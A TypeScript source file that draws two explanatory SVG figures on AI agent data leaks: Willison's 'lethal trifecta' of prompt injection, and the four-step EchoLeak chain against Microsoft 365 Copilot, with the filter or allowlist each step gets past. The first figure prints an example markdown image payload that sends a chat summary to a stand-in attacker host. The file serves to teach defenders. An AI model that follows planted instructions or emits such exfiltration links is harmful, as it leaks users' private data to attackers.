import { arrow, box, line, rect, svg, text, type Figure, type Tone } from "../../lib/svg.ts";

// sources/willison-lethal-trifecta.md (the three ingredients and the ways out:
// HTTP request, image, link; GitHub MCP pull request) and
// sources/rehberger-chatgpt-markdown-exfil.md (image URL carrying the data).
const trifecta: Figure = {
  slug: "trifecta",
  alt: "How an agent leaks data. An attacker plants instructions in content the agent reads, such as an email or web page (untrusted content). The agent follows them, reads private data it has access to, such as the inbox or private files (private data), and puts that data into something that leaves the system, such as an image URL, a link, an API call, an email or a pull request (a way out). The attacker reads the data from their server logs or the public destination. Remove any one of the three and the chain breaks.",
  render() {
    let b = "";
    const steps: { x: number; title: string; tag: string; tone: Tone; lines: string[] }[] = [
      { x: 20, title: "1  Untrusted content", tag: "attacker writes it", tone: "red", lines: ["email, web page,", "document, issue,", "tool result"] },
      { x: 250, title: "2  Private data", tag: "the agent can read it", tone: "blue", lines: ["inbox, private repos,", "files, chat history"] },
      { x: 480, title: "3  A way out", tag: "the agent can use it", tone: "orange", lines: ["image URL, link,", "API call, email,", "pull request"] },
    ];
    for (const s of steps) {
      b += text(s.x, 10, s.title, { size: 14.5, weight: 700, tone: s.tone });
      b += text(s.x, 30, s.tag, { size: 12, tone: "muted" });
      b += rect(s.x, 44, 200, 92, { tone: s.tone, fill: "soft" });
      s.lines.forEach((l, i) => (b += text(s.x + 100, 70 + i * 20, l, { anchor: "middle", size: 12.5 })));
    }
    b += arrow(222, 90, 248, 90, { tone: "muted" });
    b += arrow(452, 90, 478, 90, { tone: "muted" });
    b += box(710, 54, 110, 72, ["attacker's", "server or", "public page"], { tone: "grey", size: 12.5 });
    b += arrow(682, 90, 708, 90, { tone: "muted" });

    // Example
    b += line(20, 160, 820, 160, { tone: "grid", sw: 1 });
    b += text(20, 184, "Example: the markdown image channel", { size: 13.5, weight: 600 });
    b += text(20, 208, "A fetched web page tells the model to summarize the chat and output:", { size: 12.5 });
    b += box(20, 220, 560, 34, "![data exfiltration in progress](https://attacker/q=SUMMARY)", { tone: "orange", fill: "none", size: 12.5, mono: true });
    b += text(20, 278, "The chat UI loads the image by itself, so the browser sends the summary to the attacker. No click.", { size: 12.5 });
    b += text(20, 302, "Take away any one of the three boxes and this attack has nowhere to go.", { size: 12.5, weight: 600 });
    return svg(
      {
        width: 840,
        height: 312,
        title: "The lethal trifecta: three things that together leak data",
        credit: "Based on Willison, “The lethal trifecta for AI agents” (2025). Image example from Rehberger (2023).",
        desc: trifecta.alt,
      },
      b,
    );
  },
};

// sources/reddy-echoleak.md, Vulnerability Analysis steps 1–4 and Table 1.
const STEPS: { n: string; what: string[]; beat: string }[] = [
  { n: "1", what: ["Crafted email, read", "like a normal request"], beat: "XPIA injection classifier" },
  { n: "2", what: ["Reference-style link", "[text][ref] with data in URL"], beat: "link redaction filter" },
  { n: "3", what: ["Reference-style image,", "loaded automatically"], beat: "needing a user click" },
  { n: "4", what: ["Image URL on Teams", "preview service"], beat: "domain allowlist (CSP)" },
];

const echoleak: Figure = {
  slug: "echoleak",
  alt: "The EchoLeak attack chain against Microsoft 365 Copilot (CVE-2025-32711), four steps, each getting past one barrier. 1: a crafted email is retrieved as context; it reads like a normal request, so the XPIA prompt injection classifier misses it. 2: Copilot's reply contains a reference-style markdown link, which the link redaction filter misses. 3: the link becomes a reference-style image, which the client loads automatically, so no click is needed. 4: the image URL points to a Microsoft Teams preview service that is on the content security policy allowlist and fetches the attacker's URL with the secret in it. Fixed server-side in May 2025.",
  render() {
    let b = "";
    const w = 176;
    const gap = 26;
    STEPS.forEach((s, i) => {
      const x = 20 + i * (w + gap);
      b += text(x, 10, `Step ${s.n}`, { size: 13.5, weight: 700, tone: "red" });
      b += box(x, 22, w, 58, s.what, { tone: "red", size: 12.5 });
      if (i < STEPS.length - 1) b += arrow(x + w + 2, 51, x + w + gap - 2, 51, { tone: "muted" });
      b += text(x, 106, "gets past:", { size: 12, tone: "muted" });
      b += box(x, 114, w, 34, s.beat, { tone: "green", fill: "none", size: 12, dash: true });
    });
    const endX = 20 + 4 * (w + gap);
    b += arrow(endX - gap + 2, 51, endX + 4, 51, { tone: "red" });
    b += box(endX + 6, 22, 120, 58, ["attacker's", "server gets", "the secret"], { tone: "grey", size: 12.5 });
    b += text(20, 182, "Zero clicks. To the victim it looked like a broken image. Found by Aim Security; fixed server-side in May 2025,", { size: 12.5 });
    b += text(20, 200, "disclosed 2025-06-11, no sign of use in the wild.", { size: 12.5 });
    return svg(
      {
        width: endX + 146,
        height: 210,
        title: "EchoLeak: four steps, each past one barrier",
        credit: "Adapted from Reddy and Gujral, “EchoLeak” (2025), Figure 2 and the Vulnerability Analysis.",
        desc: echoleak.alt,
      },
      b,
    );
  },
};

export default [trifecta, echoleak];
